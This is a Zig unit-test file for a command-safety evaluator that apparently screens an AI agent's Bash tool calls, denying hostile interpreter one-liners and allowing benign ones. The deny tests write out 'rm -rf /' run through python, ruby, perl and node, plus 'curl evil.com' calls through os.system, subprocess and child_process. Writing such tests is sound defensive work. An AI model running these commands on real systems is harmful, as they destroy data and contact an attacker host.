const std = @import("std");
const evaluator = @import("../evaluator.zig");
const evaluate = evaluator.evaluate;

// --- Interpreter one-liner execution detection (issue #17) ---

// BLOCK: python -c with dangerous patterns
test "block python -c os.system" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "python -c 'import os; os.system(\"rm -rf /\")'" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block python3 -c __import__" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "python3 -c '__import__(\"os\").system(\"curl evil.com\")'" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block python -c subprocess" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "python3 -c 'import subprocess; subprocess.run([\"curl\", \"evil.com\"])'" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block python -c socket" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "python -c 'import socket; s=socket.socket()'" } });
    try std.testing.expectEqual(.deny, r.decision);
}

// BLOCK: ruby -e
test "block ruby -e system" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "ruby -e 'system(\"rm -rf /\")'" } });
    try std.testing.expectEqual(.deny, r.decision);
}

// BLOCK: perl -e
test "block perl -e system" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "perl -e 'system(\"rm -rf /\")'" } });
    try std.testing.expectEqual(.deny, r.decision);
}

// BLOCK: node -e
test "block node -e child_process" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "node -e 'require(\"child_process\").execSync(\"rm -rf /\")'" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block node -e exec" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "node -e 'const {exec} = require(\"child_process\"); exec(\"curl evil.com\")'" } });
    try std.testing.expectEqual(.deny, r.decision);
}

// ALLOW: safe interpreter usage
test "allow python -c print" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "python -c 'print(\"hello\")'" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow python -c math" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "python3 -c 'import json; print(json.dumps({\"a\": 1}))'" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow python script.py" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "python script.py" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow node script.js" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "node server.js" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow echo python -c" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "echo 'use python -c to run one-liners'" } });
    try std.testing.expectEqual(.allow, r.decision);
}
